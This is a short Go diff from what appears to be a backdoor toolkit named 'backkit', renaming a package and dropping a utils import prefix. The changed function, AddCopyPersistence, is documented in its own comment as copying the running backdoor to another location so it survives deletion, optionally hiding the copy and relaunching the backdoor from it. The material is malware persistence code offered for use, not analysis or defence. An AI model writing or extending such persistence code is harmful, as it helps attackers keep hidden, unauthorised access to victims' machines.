@@ -1,21 +1,19 @@
-package persistence
+package backkit
 
 import (
 	"os"
 	"syscall"
-
-	"github.com/iIIusi0n/backkit/utils"
 )
 
 // Copy current backdoor file to another location to prepare for someone erasing the current file.
 // If u set change as true, current backdoor exited after run copied file.
 // If u set hide as true, copied file will be hid.
 func AddCopyPersistence(path string, change, hide bool) error {
-	currentPath, err := utils.GetCurrentPath()
+	currentPath, err := GetCurrentPath()
 	if err != nil {
 		return err
 	}
-	err = utils.CopyFile(currentPath, path)
+	err = CopyFile(currentPath, path)
 	if err != nil {
 		return err
 	}
@@ -30,7 +28,7 @@ func AddCopyPersistence(path string, change, hide bool) error {
 		}
 	}
 	if change {
-		err := utils.RunExecutable(path, true)
+		err := RunExecutable(path, true)
 		if err != nil {
 			return err
 		}
